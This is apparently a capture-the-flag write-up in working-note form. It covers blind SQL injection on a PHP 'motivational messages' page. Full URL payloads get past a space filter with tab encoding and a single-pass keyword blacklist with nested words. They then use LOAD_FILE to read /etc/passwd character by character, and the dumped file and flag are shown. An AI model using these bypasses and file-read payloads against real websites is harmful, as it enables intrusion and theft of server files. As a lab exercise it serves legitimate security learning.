We finished with the search_engine saga, now there seemst to be 
a page and no source code :)
Let's try and reconstruct the query from different inputs to the id parameter
in the motivational messages

Let's first try some intputs:
ID=-1 -> No input

well it seems to be displaying
[... UNION] SELECT <value_names/*> FROM <table> WHERE id=<ID> ... [UNION ...]
There may be more logic to it but let's assume that for now

ID=a ->
Fatal error: Uncaught Error: Call to a member function fetch_assoc() on boolean in /var/www/html/level7.php:32 Stack trace: #0 {main} thrown in /var/www/html/level7.php on line 32
Well that looks like and information disclosuere vulnerability
first, we are running at /var/www/html/level7.php
There is a fetch_assoc() on line 32 of the PHP file

It seems that the input is not sanitized, let's try a simple injection

Let's try the classic ' OR 1=1

We got a "Hacker detected" page :/ Well it seems to be filtering single quotes or something, let's investigate more
using only
id=' -> Same error
Well it doesn't seem to be a single quote issue, maybe it's the OR
id=OR -> Same error
Nope, well, maybe it has a blacklist of patterns or something
Let's try ' OR
id=' OR -> Hacker detected
Hmmm.. maybe it's the spaces then? let's try somehting simple
id=1 1 -> Hacker detected :)
It's the spaces, let's see if %09 is disallowed too
id=1%091 -> Error :)

Well let's try injecting for a list of all the motivational quotes
id=1%09OR%091=1 -> Error
It seems to be throwing for some reson, let's try commenting the rest
id=1%09OR%091=1# -> Error

Well it's not trailing SQL that's the issue
Maybe it's some sort of validation on the PHP level going wrong
1%23SELECT
Seems to be fine, that means 2 things:
    1. We are indeed injecting (Since it's not failing)
    2. There may be something trailing there

Let's try some more things:
1%09OR%09 -> ID 1 is retrieved correctly (Valid)
1%09AND%09 -> Fails ....
Interesting, the input sanitization may have more to it than just spaces
Let's try playing around with it a bit..

1OR -> Valid
OR1 -> Valid
OR1OR -> Valid
1AND -> Exception

Hmm I see... Well there seems to be substitution of some sort... expecting

if \x20 in id:
    die('Hacker detected')

BLACKLIST = [OR, ...]
for bad in BLACKLIST:
    remove bad from id

Let's try bypassing the substitution
First we need to construct a list of banned keywords which we want to use
We'll also check here if it ignores case

1 -> Valid 
1oR -> Valid (subst)
1AND -> Exception (no subst)
1SeLEct -> Valid (subst) # Seems to be ignoring case
1FROM -> Valid (subst)
1* -> Exception (no subst)
1WHERE -> Exception (no subst)
1= -> 1%3D -> Exception (no subst)
1UNION -> Valid (subst)

This seems to be everything we need for extracting data from the DB
Now we need to understand the following
* Whether there are multiple passes
* In which order these are filtered (Since filtering may substitute everything)

Both of these we will check on demand

1OorR -> Exception :)
It also means that there is a single pass, so the order doesn't matter too
since we can use BbannedANNED for every substitution in order to avoid it
Let's try extracting more data

1%09OorR%091=1 -> Valid result, as expected, but we are only seeing a single result, we may be injecting

Let's prove that we are indeed injecting
1%09AND%091=1 -> Valid result, as expected
1%09AND%091=0 -> empty result, as expected
Injection is working :D

However, it seems to be returning only one result, so we need to make sure we are returned
first, let's try something like so:
-1 OR id=2
After sanitization bypass it should become
-1%09OorR%09id=2

Great :) we can now fully control the display result using
-1 UNION SELECT <something> AS id FROM <somewhere>
This will fetch the first row for us from wherever we want

Well let's list the DBs we have access to
(Since we only have a single result each time we might want to filter out things like INFORMATION_SCHEMA later)
-1 UNION SELECT schema_name AS id FROM information_schema.schemata

With sanitization bypass this will look:
-1%09UunionNION%09SselectELECT%09schema_name%09AS%09id%09FfromROM%09information_schema.schemata

Seems to be crashing hmm...
Maybe I missed some sanitization, tried:
1schemata -> Not sanitized
1AS -> Not sanitized
1id -> Not sanitized

Hmm I suppose then that ID is not the correct value name
After some searching it indeed does look that there isn't any simple self-referencing
columns, I need to know what to join / maybe guess the values

Also, of course this would be an error, since I am UNION-ing different sizes, there should
be at least 2 columns in the motivational quotes table

Let's try various sizes, the schemata table should always exist

Trying:
    2 columns
    ID, VARCHAR types
-1%09UunionNION%09SselectELECT%091,NULL%09FfromROM%09information_schema.schemata#

Ok so this looks like a too complicated of a way, after playing around a bit
with UNIONs and stuff I reached the following experiment which can be done to
try and test the number of columns methodically

First being inserting a single valid row into a variable
0%09LIMIT%091%09INTO%09%40x

And hopefully if the session doesn't get disconnected, fetching it afterwards

Oh wait ...
From the page code I see:

var spawn_motivation = function() {
				var id = Math.floor(Math.random() * 6);
				document.location = document.location.origin + "/level7.php?id=" + id;
			}

Which means that the stored variables will be deleted
Let's search for interesting metadata where there is a single column so that we can use *
Hmm but this doesn't really help us since the row name is different

###
I have an idea! we can utilize the numbers 0-6 to know information maybe about the table by
selecting queries that resolve to one of these numbers!
###

After some messing around I crafted the following working query
?id=(SselectELECT%09OCT((SselectELECT%09LOAD_FILE('\0'))))
?id=(SselectELECT%09OCT((SselectELECT%09LOAD_FILE('/var/www/html/level7.php'))))
AS expected :D id returns the relevant Octal value of the character!

And conveniently, there are 7 messsages :)
We can with enough requests get ALL the characters of the level file!

Each character requires 3 requests only
Currently playing around with ASCII / ORD / etc.. & binary shifting and operations for getting the loop logic right

This should do the trick :)
SELECT OCT((SELECT ASCII('5')));
SELECT OCT(((SELECT ASCII('5')) >> 6) & 7);
SELECT OCT(((SELECT ASCII('5')) >> 3) & 7);
SELECT OCT(((SELECT ASCII('5')) >> 0) & 7);

Let's try extracting the first character to see if it makes sense before proceeding (Expecting '<' or '#' or some whitespace)
The query should be
(SELECT OCT(
    (SELECT ASCII(
        (SELECT LOAD_FILE('/var/www/html/level7.php'))
        ) >> 6
    ) & 7
)
)

Also checked LOAD_FILE, OCT, and ASCII for ensuring the query would run and it is
LOAD_FILE was also banned :) noted, this also means that the previous "PoC" with LOAD_FILE returned NULL


With mitigation bypass this should be:
?id=(SselectELECT%09OCT((SselectELECT%09ASCII((SselectELECT%09Lload_fileOAD_FILE(%27%2Fvar%2Fwww%2Fhtml%2Flevel7.php%27)))>>6)%267))

Great the script is not crashing, however we are getting empty output for some reason, meaning one of two things:
* Either the path is incorrect or we don't have access
* We are getting a value outside of the scope of the return

Let's test without the LOAD_FILE
(SselectELECT%09OCT((SselectELECT%09ASCII(%27test%27)>>6)%267))
(SselectELECT%09OCT((SselectELECT%09ASCII(%27test%27)>>3)%267))
(SselectELECT%09OCT((SselectELECT%09ASCII(%27test%27)>>0)%267))

Seems to return different values, which is an indication of it working!
well then what's with our file, let's try checking whether we read it or not:

?id=(SELECT LOAD_FILE('/var/www/html/level7.php') IS NULL)

We should get "JUST DO IT" (id=1) for TRUE, and "DO IT" (id=0) for FALSE

Query: (SselectELECT%09Lload_fileOAD_FILE('%2Fvar%2Fwww%2Fhtml%2Flevel7.php')%09IS%09NOT%09NULL)
We got "DO IT" :/
Which means the file doesn't exist or we do not have access to it, let's try with the original
requested /etc/passwd
(SselectELECT%09Lload_fileOAD_FILE('/etc/passwd')%09IS%09NOT%09NULL)
We got "JUST DO IT" :D

Oh well, we can't seem to get the site, but let's get the password
?id=(SselectELECT%09OCT((SselectELECT%09ASCII((SselectELECT%09Lload_fileOAD_FILE('/etc/passwd')))>>6)%267))

YES! It's working, we got a value for each shift
Let's map the Messages to their corresponding IDs in the appendix
Message->ID
    "DO IT" = 0 (000)
    "JUST DO IT" = 1 (001)
    "DON'T LET YOUR DREAMS BE DREAMS" = 2 (010)
    "NOTHING IS IMPOSSIBLE" = 3 (011)
    "STOP GIVING UP" = 4 (100)
    "MAKE YOUR DREAMS COME TRUE" = 5 (101)
    "" = 6/7 (110/111)
        -> Repeat but with & 1
            "DO IT" -> 6
            "JUST DO IT" -> 7

First letter example:
?id=(SselectELECT%09OCT((SselectELECT%09ASCII((SselectELECT%09Lload_fileOAD_FILE('/etc/passwd')))>>6)%267))
-> "JUST DO IT" -> 01 (Upper 2 most significant bits)
?id=(SselectELECT%09OCT((SselectELECT%09ASCII((SselectELECT%09Lload_fileOAD_FILE('/etc/passwd')))>>3)%267))
-> "" -> 6/7
    ?id=(SselectELECT%09OCT((SselectELECT%09ASCII((SselectELECT%09Lload_fileOAD_FILE('/etc/passwd')))>>3)%261))
    -> "DO IT" -> 6 -> 110
?id=(SselectELECT%09OCT((SselectELECT%09ASCII((SselectELECT%09Lload_fileOAD_FILE('/etc/passwd')))>>0)%267))
-> "DON'T LET YOUR DREAMS BE DREAMS" -> 5 -> 101

Together these are 01110101 -> 0x75 -> 'u'
nice.. let's now add an offset for it
It seems SUBSTR can help us here, let's check first if it's sanitized
Nope, seems good to go
Let's try it out with the first letter again (first index fro SUBSTR is 1 not 0)
?id=(SselectELECT%09OCT((SselectELECT%09ASCII((SselectELECT%09SUBSTR((SselectELECT%09Lload_fileOAD_FILE('/etc/passwd')),1)))>>6)%267))
-> "JUST DO IT"
?id=(SselectELECT%09OCT((SselectELECT%09ASCII((SselectELECT%09SUBSTR((SselectELECT%09Lload_fileOAD_FILE('/etc/passwd')),1)))>>3)%267))
-> "" -> &1 -> "DO IT"
?id=(SselectELECT%09OCT((SselectELECT%09ASCII((SselectELECT%09SUBSTR((SselectELECT%09Lload_fileOAD_FILE('/etc/passwd')),1)))>>0)%267))
-> "DON'T LET YOUR DREAMS BE DREAMS"

Sweet :)
Let's test the second letter then write a script for the program
?id=(SselectELECT%09OCT((SselectELECT%09ASCII((SselectELECT%09SUBSTR((SselectELECT%09Lload_fileOAD_FILE('/etc/passwd')),2)))>>6)%267))
-> 1
?id=(SselectELECT%09OCT((SselectELECT%09ASCII((SselectELECT%09SUBSTR((SselectELECT%09Lload_fileOAD_FILE('/etc/passwd')),2)))>>3)%267))
-> 5
?id=(SselectELECT%09OCT((SselectELECT%09ASCII((SselectELECT%09SUBSTR((SselectELECT%09Lload_fileOAD_FILE('/etc/passwd')),2)))>>0)%267))
-> ?id=(SselectELECT%09OCT((SselectELECT%09ASCII((SselectELECT%09SUBSTR((SselectELECT%09Lload_fileOAD_FILE('/etc/passwd')),2)))>>0)%261))
    -> "JUST DO IT" -> 7

Then the second character is 01101111 = 0x6F = 'o'

Seems to be fine :)
Let's write a small script that iterates through it all

After learning some JS and writing a script we got...

Voila!

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:103:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:104:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:105:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:106:systemd Bus Proxy,,,:/run/systemd:/bin/false
mysql:x:999:999::/home/mysql:/bin/sh
FLAG-is_this_sqli_or_lfi:x:1000:1000::/home/FLAG-is_this_sqli_or_lfi:/bin/bash

Appendix:
    Banned Keyword (Hacker detected message):
        space (%20)
    Sanitized SQL keywords:
        UNION
        OR
        SELECT
        FROM
        WHERE
        LOAD_FILE
    Message->ID
    "DO IT" = 0 (000)
    "JUST DO IT" = 1 (001)
    "DON'T LET YOUR DREAMS BE DREAMS" = 2 (010)
    "NOTHING IS IMPOSSIBLE" = 3 (011)
    "STOP GIVING UP" = 4 (100)
    "MAKE YOUR DREAMS COME TRUE" = 5 (101)
    "" = 6/7 (110/111)
        -> Repeat but with & 1
            "DO IT" -> 6
            "JUST DO IT" -> 7
    
